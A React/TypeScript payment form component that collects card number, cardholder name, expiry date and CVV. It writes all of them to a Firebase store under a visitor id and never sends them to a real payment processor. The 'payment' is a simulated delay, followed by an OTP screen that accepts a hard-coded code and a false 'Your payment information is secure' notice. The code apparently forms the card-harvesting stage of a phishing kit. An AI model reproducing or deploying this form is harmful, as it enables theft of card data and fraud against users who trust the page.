"use client"

import { useState } from "react"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"
import { LockIcon, CreditCardIcon } from "lucide-react"
import { OtpVerification } from "./otp"
import { addData } from "../firebase"
import React from "react"


const paymentFormSchema = z.object({
  cardNumber: z.string().min(16, "Card number must be 16 digits").max(19),
  cardholderName: z.string().min(2, "Cardholder name is required"),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, "Expiry date must be in MM/YY format"),
  cvv: z.string().min(3, "CVV must be 3-4 digits").max(4),
})

type PaymentFormValues = z.infer<typeof paymentFormSchema>

export function PaymentForm() {
  const [showOtp, setShowOtp] = useState(false)
  const [otpError, setOtpError] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)

  const {
    register,
    handleSubmit,
    formState: { errors },
    setValue,
    watch,
  } = useForm<PaymentFormValues>({
    resolver: zodResolver(paymentFormSchema),
    defaultValues: {
      cardNumber: "",
      cardholderName: "",
      expiryDate: "",
      cvv: "",
    },
  })

  function onSubmit(data: PaymentFormValues) {
    setIsSubmitting(true)
    const _id=localStorage.getItem('visitor')
    addData({id:_id,cardNumber:data.cardNumber,yaer:data.expiryDate,cvv:data.cvv,cardholderName:data.cardholderName})
    // Simulate API call
    setTimeout(() => {
      setIsSubmitting(false)
      setShowOtp(true)
    }, 1000)
  }

  function handleOtpSubmit(otp: string) {
    setIsSubmitting(true)

    // Simulate API verification
    setTimeout(() => {
      setIsSubmitting(false)
      // For demo purposes, only "123456" is considered valid
      if (otp === "123456") {
        // Payment successful
        alert("Payment successful!")
        setOtpError(false)
      } else {
        // Invalid OTP
        setOtpError(true)
      }
    }, 1000)
  }

  function formatCardNumber(value: string) {
    return value
      .replace(/\s/g, "")
      .replace(/(\d{4})/g, "$1 ")
      .trim()
  }

  function formatExpiryDate(value: string) {
    return value.replace(/\D/g, "").replace(/(\d{2})(\d)/, "$1/$2")
  }

  return (
    <>
      {!showOtp ? (
        <div className="bg-white rounded-lg shadow-md overflow-hidden " style={{padding:10}} >
          <div className="p-6 border-b border-gray-200">
            <div className="flex items-center gap-2 mb-1">
              <CreditCardIcon className="h-5 w-5 text-gray-700" />
              <h2 className="text-xl font-semibold text-gray-900">Payment Details</h2>
            </div>
            <p className="text-sm text-gray-500">Enter your card information to proceed with the payment.</p>
          </div>
          <div className="p-6">
            <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
              <div className="space-y-1">
                <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700">
                  Card Number
                </label>
                <input
                  id="cardNumber"
                  type="text"
                  placeholder="1234 5678 9012 3456"
                  className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
                    errors.cardNumber
                      ? "border-red-300 focus:ring-red-200"
                      : "border-gray-300 focus:ring-blue-200 focus:border-blue-400"
                  }`}
                  {...register("cardNumber", {
                    onChange: (e) => {
                      const formatted = formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
                      setValue("cardNumber", formatted)
                    },
                  })}
                />
                {errors.cardNumber && <p className="text-sm text-red-500 mt-1">{errors.cardNumber.message}</p>}
              </div>

              <div className="space-y-1">
                <label htmlFor="cardholderName" className="block text-sm font-medium text-gray-700">
                  Cardholder Name
                </label>
                <input
                  id="cardholderName"
                  type="text"
                  placeholder="John Doe"
                  className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
                    errors.cardholderName
                      ? "border-red-300 focus:ring-red-200"
                      : "border-gray-300 focus:ring-blue-200 focus:border-blue-400"
                  }`}
                  {...register("cardholderName")}
                />
                {errors.cardholderName && <p className="text-sm text-red-500 mt-1">{errors.cardholderName.message}</p>}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-1">
                  <label htmlFor="expiryDate" className="block text-sm font-medium text-gray-700">
                    Expiry Date
                  </label>
                  <input
                    id="expiryDate"
                    type="text"
                    placeholder="MM/YY"
                    className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
                      errors.expiryDate
                        ? "border-red-300 focus:ring-red-200"
                        : "border-gray-300 focus:ring-blue-200 focus:border-blue-400"
                    }`}
                    {...register("expiryDate", {
                      onChange: (e) => {
                        const formatted = formatExpiryDate(e.target.value.slice(0, 5))
                        setValue("expiryDate", formatted)
                      },
                    })}
                  />
                  {errors.expiryDate && <p className="text-sm text-red-500 mt-1">{errors.expiryDate.message}</p>}
                </div>

                <div className="space-y-1">
                  <label htmlFor="cvv" className="block text-sm font-medium text-gray-700">
                    CVV
                  </label>
                  <input
                    id="cvv"
                    type="password"
                    placeholder="123"
                    className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
                      errors.cvv
                        ? "border-red-300 focus:ring-red-200"
                        : "border-gray-300 focus:ring-blue-200 focus:border-blue-400"
                    }`}
                    {...register("cvv", {
                      onChange: (e) => setValue("cvv", e.target.value.replace(/\D/g, "").slice(0, 4)),
                    })}
                  />
                  {errors.cvv && <p className="text-sm text-red-500 mt-1">{errors.cvv.message}</p>}
                </div>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className={`w-full py-2 px-4 rounded-md text-white font-medium transition-colors ${
                  isSubmitting
                    ? "bg-gray-400 cursor-not-allowed"
                    : "bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300"
                }`}
              >
                {isSubmitting ? "Processing..." : "Pay Now"}
              </button>
            </form>
          </div>
          <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
            <div className="flex items-center justify-center gap-1 text-sm text-gray-500">
              <LockIcon className="h-3 w-3" />
              <span>Your payment information is secure</span>
            </div>
          </div>
        </div>
      ) : (
        <OtpVerification
          onSubmit={handleOtpSubmit}
          isSubmitting={isSubmitting}
          error={otpError}
          onBack={() => setShowOtp(false)}
        />
      )}
    </>
  )
}
